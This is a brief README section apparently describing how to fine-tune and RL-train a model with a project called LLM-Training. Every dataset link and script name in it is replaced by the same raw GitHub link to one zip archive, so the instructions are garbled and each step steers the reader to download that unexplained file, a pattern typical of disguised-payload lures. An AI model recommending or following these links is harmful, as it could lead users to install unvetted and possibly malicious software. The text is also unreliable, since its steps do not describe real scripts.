## 🎓 How to Use LLM-Training

### 🌟 Supervised Fine-Tuning (SFT)
With the SFT feature, you can train your model using synthetic data. Here’s how to use this feature:

1. **Prepare Your Dataset**
   - Use the dataset from [joyce8/EMBER2024-capa](https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip) to get started.

2. **Generate Synthetic Data**
   - Utilize the script `https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip` located in the application folder. Running this will help you create a dataset tailored for training.

3. **Train Your Model**
   - To train the model, use the script named `https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip`. This will begin the training process with the prepared dataset.

### 🏆 Reinforcement Learning with Verifiable Rewards (RLVR)
RLVR allows enhanced training of your model through additional reinforcement learning techniques.

1. **Set Up the Verifier**
   - Use the `capa verifier` to verify the rewards during training.

2. **Train the Model**
   - Start the RL training using the `https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip`. This script will guide you through the process, allowing you to leverage the rewards effectively.
